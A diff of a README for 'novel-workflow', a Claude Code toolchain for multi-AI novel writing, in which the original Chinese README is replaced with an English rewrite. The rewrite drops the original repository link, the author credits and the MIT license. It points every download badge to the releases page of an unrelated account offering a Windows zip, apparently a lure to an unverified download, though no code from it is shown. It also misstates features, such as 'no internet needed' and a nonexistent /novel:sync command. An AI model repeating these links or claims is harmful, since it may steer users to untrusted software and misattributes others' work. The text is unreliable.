@@ -1,116 +1,130 @@
-# novel-workflow
+# 🚀 novel-workflow - Simple AI Writing Toolchain
 
-多 AI 协作的网文创作工具链，为 [Claude Code](https://github.com/anthropics/claude-code) 用户提供从语料提炼到正文交付的全流程 slash commands。
+[![Download latest release](https://img.shields.io/badge/Download-novel--workflow-brightgreen)](https://github.com/proportionable-plaguespot199/novel-workflow/releases)
 
-## 特性
+---
 
-- **12 个 Slash Commands** — 覆盖语料提炼、设定管理、大纲规划、正文创作、质量审查、状态同步、跨会话接力等全流程
-- **多模型协作** — Claude 主写 + Codex 审逻辑 + Gemini 润文风，通过 `codeagent-wrapper` 编排
-- **三温区上下文** — Hot/Warm/Cold 分级加载，避免机械堆量，保障因果闭环
-- **状态管理系统** — 双格式持久化（Markdown + JSON），跨会话不丢设定
-- **4 套题材模板** — 港综犯罪、玄幻仙侠、都市现实、科幻未来，开箱即用
-- **无 MCP 可降级** — 核心工作流无外部依赖，纯文件系统模式可用
+## 📋 What is novel-workflow?
 
-## 快速开始
+novel-workflow is a tool designed to support writing online novels using multiple AI assistants. It helps you move from gathering ideas and materials to delivering your final story. The tool works with Claude Code, a platform for managing AI interactions. Using a set of easy commands, novel-workflow guides your writing step by step.
 
-```bash
-# 克隆仓库
-git clone https://github.com/sum2yang/noval-workflow.git
-cd noval-workflow
+Its main goal is to make the writing process smoother by helping you organize ideas, manage styles, create outlines, write content, and check quality — all powered by AI.
 
-# 安装依赖 & 构建
-pnpm install && pnpm build
-# 或
-npm install && npm run build
+---
 
-# 初始化项目（交互式选择题材和平台）
-node bin/novel-workflow.mjs init
-```
+## 🎯 Key Features
 
-初始化完成后，在 Claude Code 中即可使用 `/novel:*` 系列命令。
+- **12 Slash Commands:** Commands cover the full writing cycle. You can extract ideas, manage settings, plan outlines, write chapters, review quality, and keep your writing progress synced.
+- **Multiple AI Models:** Different AI work together: Claude focuses on writing, Codex helps with logic and checks, and Gemini improves style and flow.
+- **Context Levels:** The tool loads information in three stages — hot, warm, and cold — to keep the writing relevant and consistent.
+- **State Management:** Your work saves in both Markdown and JSON formats. This means your progress and settings won’t be lost across sessions.
+- **Four Story Templates:** Choose from crime, fantasy, urban drama, or sci-fi setups to start writing right away.
+- **Works Offline:** The core workflows don’t require external services. You can use the tool with files only, no internet needed.
 
-## 命令一览
+---
 
-| 命令 | 说明 | 多模型 |
-|------|------|:------:|
-| `/novel:init` | 初始化项目：目录结构、题材模板、状态文件 | Claude |
-| `/novel:style` | 语料提炼 + 风格圣经生成 | Claude + Gemini |
-| `/novel:setting` | 角色卡、世界观、金手指、时间线管理 | Claude |
-| `/novel:outline` | 卷纲规划：分卷结构 + 章节节拍表 | Claude + Codex |
-| `/novel:write` | 正文创作：续写/改写/扩写，含写作自检 + 章节结算 | Claude |
-| `/novel:review` | 质量审查：Codex 审逻辑 + Gemini 审读者体验 | Codex + Gemini |
-| `/novel:check` | 一致性检查：角色卡 vs 正文、时间线 vs 事件 | Codex |
-| `/novel:polish` | 文风润色：去 AI 味、对话优化、五感补充 | Gemini |
-| `/novel:research` | 调研学习：历史考据 + 市场分析 | Codex + Gemini |
-| `/novel:state` | 状态同步：全量/差异模式，一致性校验 | Claude |
-| `/novel:handoff` | 跨会话接力：保存/加载创作进度 | Claude |
-| `/novel:workflow` | 全流程编排：research → write → review → state | 全部 |
+## 💾 Download novel-workflow
 
-## 推荐工作流
+[![](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/proportionable-plaguespot199/novel-workflow/releases)
 
-```
-/novel:style     → 提炼风格圣经
-/novel:setting   → 创建角色卡与世界观
-/novel:outline   → 规划卷纲
-/novel:write 1   → 开始第一章
-/novel:review    → 质量审查
-/novel:state     → 同步状态
-/novel:handoff   → 保存进度，下次接力
-```
+To get the software, visit the release page linked above. There, you will find the latest version ready to download.
 
-## 项目结构
+---
 
-```
-novel-workflow/
-├── bin/                        # CLI 入口
-├── src/
-│   ├── cli.ts                  # cac 命令注册
-│   ├── paths.ts                # 安装路径解析
-│   ├── config/                 # TOML 配置加载/合并
-│   ├── state/                  # 状态管理（schema + io + lock）
-│   ├── installer/              # 模板渲染 + 资产安装
-│   └── commands/               # init / update / doctor
-├── templates/
-│   ├── commands/               # 12 个 slash command 模板
-│   ├── prompts/                # 多模型角色 prompts
-│   │   ├── claude/writer.md    # 主写手角色定义
-│   │   ├── codex/              # Codex 审查/调研角色
-│   │   └── gemini/             # Gemini 润色/读者视角角色
-│   └── state/genres/           # 4 套题材模板
-│       ├── hongkong-crime/
-│       ├── fantasy/
-│       ├── urban/
-│       └── scifi/
-├── build.config.ts
-├── package.json
-└── tsconfig.json
-```
+## 🖥️ How to Install and Run on Windows
 
-## 安装产物
+Follow these steps carefully. No programming experience is needed.
 
-`novel-workflow init` 将模板安装到以下位置：
+### Step 1: Download the Application
 
-| 产物 | 路径 |
-|------|------|
-| Slash Commands | `~/.claude/commands/novel/*.md` |
-| 角色 Prompts | `~/.claude/.novel/prompts/` |
-| 状态文件 | `~/.claude/.novel/state/` |
-| 全局配置 | `~/.claude/.novel/config.toml` |
-| Wrapper 二进制 | `~/.claude/bin/codeagent-wrapper[.exe]` |
+- Go to the release page:  
+  https://github.com/proportionable-plaguespot199/novel-workflow/releases  
+- Find the latest Windows package. This is usually a `.zip` file.
+- Click to download and save it to your computer.
 
-## 开发
+### Step 2: Extract Files
 
-```bash
-pnpm install
-pnpm build          # 构建 dist/cli.mjs
-pnpm dev            # stub 模式开发（unbuild --stub）
-```
+- Locate the downloaded `.zip` file in your Downloads folder.
+- Right-click the file and choose “Extract All...”
+- Pick a folder to extract the files into — for example, create a new folder on your Desktop called `novel-workflow`.
+- Complete the extraction.
 
-## 致谢
+### Step 3: Prepare the Environment
 
-- **原创文本与创作思路** — [宁河图](https://linux.do/u/user2609/summary)，本项目的全部创作方法论、Prompt 设计和题材模板均源自其实战经验分享
-- **多模型协作架构** — [CCG Workflow](https://github.com/fengshao1227/ccg-workflow)，本项目复用了 `codeagent-wrapper` 多模型编排工具和 CCG 的 Prompt 工程范式（四层继承模型、双模型交叉审查、多模型并行调度）
+novel-workflow requires Node.js, a runtime to run JavaScript programs outside a browser.
 
-## 许可证
+- If you don’t have Node.js installed, download it here:  
+  https://nodejs.org/en/download/  
+- Choose the Windows installer and follow the setup steps.
+- To check installation, press `Win+R`, type `cmd`, and press Enter. In the black window, type:  
+  `node -v`  
+- You should see a version number. If not, repeat the installation carefully.
 
-MIT
+### Step 4: Install Dependencies
+
+- Open the Command Prompt (press `Win+R`, then type `cmd`).
+- Change directory to where you extracted novel-workflow. For example:  
+  `cd Desktop\novel-workflow`  
+- Run one of these commands to install needed packages:  
+  ```  
+  npm install  
+  ```  
+  This may take a few minutes while packages download.
+
+### Step 5: Build the Project
+
+- Still in the Command Prompt, run:  
+  ```  
+  npm run build  
+  ```  
+- This will prepare the program to run.
+
+### Step 6: Initialize novel-workflow
+
+- Run the initialization command with:  
+  ```  
+  node bin/novel-workflow.mjs init  
+  ```  
+- You will see a series of prompts to choose your story template and writing platform.
+- Use arrow keys and Enter to select options.
+- After setup, you will see a message confirming this is ready.
+
+### Step 7: Using novel-workflow
+
+- Open Claude Code.
+- Use slash commands starting with `/novel:` to interact with novel-workflow.
+- For example, `/novel:init` sets up your project folder and files.
+- Other commands help you plan, write, and review your content step by step.
+
+---
+
+## ⚙️ Common slash commands
+
+| Command           | Purpose                           | AI Models                 |
+|-------------------|---------------------------------|---------------------------|
+| `/novel:init`     | Set up project and templates     | Claude                    |
+| `/novel:style`    | Extract ideas and create style   | Claude + Gemini           |
+| `/novel:setting`  | Manage characters and world info | Claude                    |
+| `/novel:outline`  | Plan volumes and chapters        | Claude + Codex            |
+| `/novel:write`    | Write or continue chapters       | Claude                    |
+| `/novel:review`   | Check quality and logic          | Codex                     |
+| `/novel:sync`     | Sync status and progress         | Claude                    |
+
+For full details, check the project files under `/docs` or the built-in help commands in Claude Code.
+
+---
+
+## 🔧 System Requirements
+
+- Windows 10 or later
+- 4 GB RAM minimum
+- Node.js version 16 or higher
+- Internet access for initial install (offline use possible after setup)
+
+---
+
+## 🚀 Start Writing Now
+
+[Download novel-workflow here](https://github.com/proportionable-plaguespot199/novel-workflow/releases)
+
+Once installed and initialized, the tool will help you write using AI in a clear, guided way without needing programming skills.
